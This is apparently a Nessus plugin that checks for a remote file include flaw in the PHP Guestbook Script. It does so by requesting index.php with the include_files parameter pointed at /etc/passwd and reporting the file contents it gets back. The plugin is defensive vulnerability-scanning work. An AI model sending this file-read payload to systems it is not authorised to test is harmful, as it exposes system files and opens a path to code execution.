#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
remote file include issues. 

Description :

The remote host is running Guestbook Script, a free guestbook written
in PHP. 

The version of Guestbook Script installed on the remote host fails to
sanitize input to the 'include_files' array parameter before using it
in a PHP 'include()' function in various scripts.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this issue to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts. 

Note that the application must be running under PHP 5 for an attacker
to take code from third-party hosts. 

See also :

http://downloads.securityfocus.com/vulnerabilities/exploits/Stadtaus-Guestbook-0504-rfi.pl
http://www.stadtaus.com/forum/t-2600.html

Solution :

Upgrade to Guestbook Script 1.9 or later. 

Risk factor :

Medium / CVSS Base Score : 4.6
(AV:R/AC:L/Au:NR/C:P/I:P/A:N/B:N)";


if (description)
{
  script_id(21339);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-2158");
  script_bugtraq_id(17845);

  script_name(english:"Guestbook Script include_files Parameter Remote File Include Vulnerability");
  script_summary(english:"Tries to read /etc/passwd using Guestbook Script");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/gbs", "/gb", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd";
  req = http_get(
    item:string(
      dir, "/index.php?",
      "include_files[]=&",
      # nb: this is slightly different from rgod's advisory, but it 
      #     lets us see the content of a file after 
      # 'templates/default/entries.tpl' is parsed.
      "include_files[query_string]=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = strstr(res, "sign.php");
    if (contents) contents = contents - strstr(contents, '">');

    if (isnull(contents)) report = desc;
    else 
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );

    security_warning(port:port, data:report);
    exit(0);
  }
}
